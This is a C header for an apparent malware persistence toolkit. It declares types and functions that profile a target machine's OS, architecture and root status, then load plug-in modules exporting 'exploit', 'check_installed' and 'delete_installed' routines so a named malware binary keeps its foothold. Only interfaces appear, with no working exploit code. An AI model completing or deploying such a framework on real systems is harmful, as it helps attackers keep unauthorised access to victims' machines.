#ifndef _PERCISTENCY_HUB

#define _PERCISTENCY_HUB

#pragma region Configuration

	#ifdef __linux__
		#define                 TARGET_OPERAING_SYSTEM              LINUX
		#define                 MODULES_FOLDER                      "modules/linux"
		#define                 MODULE_EXTENSION                    ".so"
	#elif _WIN32
		#define                 TARGET_OPERAING_SYSTEM              WINDOWS
		#define                 MODULES_FOLDER                      "modules/windows"
		#define                 MODULE_EXTENSION                    ".dll"
	#else
		#error Platform not supported
	#endif

	#define                 MAX_MODULES                         32

	#define                 FUNC_NAME_CHECK_COMPATIBILIY        "check_compatibility"
	#define                 FUNC_NAME_EXPLOIT                   "exploit"
	#define                 FUNC_NAME_CHECK_INSTALLED           "check_installed"
	#define                 FUNC_NAME_DELETE_INSTALLED          "delete_installed"

#pragma endregion

#pragma region TypeDefs

	typedef                 int (*MODULE_FUNC)(void);

#pragma endregion

#pragma region Enumerations

	typedef enum{
		WINDOWS = 0,
		LINUX = 1,
		OTHERS = 2
	} OPERATING_SYSTEM;

	typedef enum{
		X32 = 0,
		X64 = 1,
		UNKNOWN = 2
	} ARCHITECTURE;

	typedef enum{
		WITHOUT_ROOT = 0,
		WITH_ROOT = 1
	} ROOTED_STATE;

	typedef struct{
		OPERATING_SYSTEM operating_system;
		ARCHITECTURE architecture;
		ROOTED_STATE is_root;
		char *malware_path;
	} ENVIRONMENT;

	typedef struct{
		int count;
		char **names;
	} MODULE_WALLET;

	typedef struct{
		char *name;
		void *handle;
		MODULE_FUNC check_compatibility;
		MODULE_FUNC exploit;
		MODULE_FUNC check_installed;
		MODULE_FUNC delete_installed;
	} LOADED_MODULE;

#pragma

#pragma region ExportedFunctions

	/**
	 * @brief Set the environment of the targetted machine and the used malware
	 * 
	 * @param env The environment object that will be setted
	 * @param os The operating system of the machine
	 * @param arch The architecture of the machine
	 * @param is_root True if the attacher has root on machine
	 * @param path_to_malware Path to the malware that need to gain persistency
	 * @return int Zero if success, non-zero if error
	 */
	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *path_to_malware);

	/**
	 * @brief Automatically set the machine details
	 * 
	 * @param env The environment object that will be setted
	 * @param path_to_malware Path to the malware that need to gain persistency
	 * @return int Zero if success, non-zero if error
	 */
	int autoset_environment(ENVIRONMENT **env, const char *path_to_malware);

	/**
	 * @brief Free the already setted environment
	 * 
	 * @param env The environment object that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_environment(ENVIRONMENT **env);

	/**
	 * @brief Get the all modules from the local setup
	 * 
	 * @param wallet Modules holder
	 * @return int Zero if success, non-zero if error
	 */
	int get_all_modules(MODULE_WALLET **wallet);

	/**
	 * @brief Free the already setted module wallet
	 * 
	 * @param wallet The module wallet that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_module_wallet(MODULE_WALLET **wallet);

	/**
	 * @brief Verify if a module is installed in the toolkit
	 * 
	 * @param wallet The module wallet, preloaded with all the modules
	 * @param name The name of the module that will be 
	 * @return bool Negative if not found and positive(or zero) if found, more exactly the index in the wallet
	 */
	int is_module_present(MODULE_WALLET *wallet, const char *name);

	/**
	 * @brief Load a module in the memory
	 * 
	 * @param module The location where the module will be loaded
	 * @param name The nme of the module
	 * @return int Zero if success, non-zero if error
	 */
	int load_module(LOADED_MODULE **module, const char *name);

	/**
	 * @brief Unlink a module
	 * 
	 * @param module The loaded module that need to be unlinked
	 * @return int Zero if success, non-zero if error
	 */
	int unlink_module(LOADED_MODULE **module);

#pragma endregion

#endif